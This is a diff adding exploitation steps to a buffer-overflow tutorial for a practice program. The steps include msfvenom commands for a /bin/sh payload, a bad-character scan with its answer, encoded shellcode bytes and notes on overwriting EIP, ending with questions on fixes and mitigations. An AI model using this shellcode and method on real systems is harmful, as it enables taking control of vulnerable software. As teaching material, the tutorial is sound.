@@ -1,13 +1,21 @@
 1. Meet the 'control' program
 
 This is a program of which you will take control in this tutorial.
-But first run it and check what it can do:
+But first run it and check what it can do. It reads a file called input 
+and runs a command from it. 
+
+Create such a file with 
+
+```
+python -c 'print("help")' > input
+```
+
+Then:
+
 
 ```
 make
 $ ./control 
-Press Ctrl+C or type end to quit
-Command: help
 	dir - lists the current directory
 	cd [folder] - switches the current directory
 	end - leave the program
@@ -89,12 +97,78 @@ The EIP is overwritten with B's 0x42424242.
 
 6. Finding place for shell code
 
+First we need to know approximately the size of the shellcode to execute.
+We will execute shell and use msfvenom to generate a payload for us.
+You have to use Kali Linux machine for it.
+
+```
+msfvenom -p linux/x86/exec CMD="/bin/sh"
+```
+
+This gives us 43 bytes. Which is quite small. If we allocate even more 
+space with our buffer overflow, it will be possible to fit the payload there 
+after EIP's value.
 
 7. Bad characters
 
+It might be that not every character is processed by the program in the 
+same way. Some might get ingored, changed. Some might serve as 
+terminators for the input. We have to figure it out before we 
+insert the shellcode which might suffer from bad characters.
+
+```
+with open("input", "w") as f:
+  for i in range (0, 256):
+    f.write(chr(i))
+```
+This will create a file with all characters, let's see how it comes to be.
+
+When we debug with it, we will figure out the bad characters such as 00, 0A, 
+and some more. Which?
+
+Answer: 00, 0A, 0D, E8.
+
+Some of them are present in our shellcode originally.
+
+
 8. Shell code generation
 
+This command generate the right shell code.
+
+```
+msfvenom -p linux/x86/exec CMD="/bin/sh"
+```
+
+But it has bad characters. Let's use encoder to remove them:
+
+```
+msfvenom -p linux/x86/exec CMD="/bin/sh" -e x86/shikata_ga_nai -b "\x00\x0a\x0d\xe8"
+```
+
+With --format python we get something like this:
+
+buf =  ""
+buf += "\xb8\x08\xf0\xd2\xae\xd9\xc6\xd9\x74\x24\xf4\x5a\x2b"
+buf += "\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x11\x03\x42\x11\xe2"
+buf += "\xfd\x9a\xd9\xf6\x64\x08\xb8\x6e\xbb\xce\xcd\x88\xab"
+buf += "\x3f\xbd\x3e\x2b\x28\x6e\xdd\x42\xc6\xf9\xc2\xc6\xfe"
+buf += "\xf2\x04\xe6\xfe\x2d\x67\x8f\x90\x1e\x14\x27\x6d\x36"
+buf += "\x89\x3e\x8c\x75\xad"
+
+
+Let's prepend it with NOPs for everything to work with encoder,
+save it to file and debug. The payload has to start in the 
+aligned fashion. This can also be achieved by varying NOPs.
+
+See payloadgen.py.
+
+Now we need to substitute the EIP with the address of the payload on the stack.
+
 9. Exploitation
+
+Debug and locate the place of the payload on the stack.
+
+It should be placed instead of B's in the shell code.
 
 
 
@@ -110,24 +184,9 @@ Are they exploitable? Could you exploit them?
 Could you fix these vulnerabilities?
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+What happens if you compile the program without executable 
+stack? Does this exploit work? 
+Is the program still vulnerable?
 
 
 
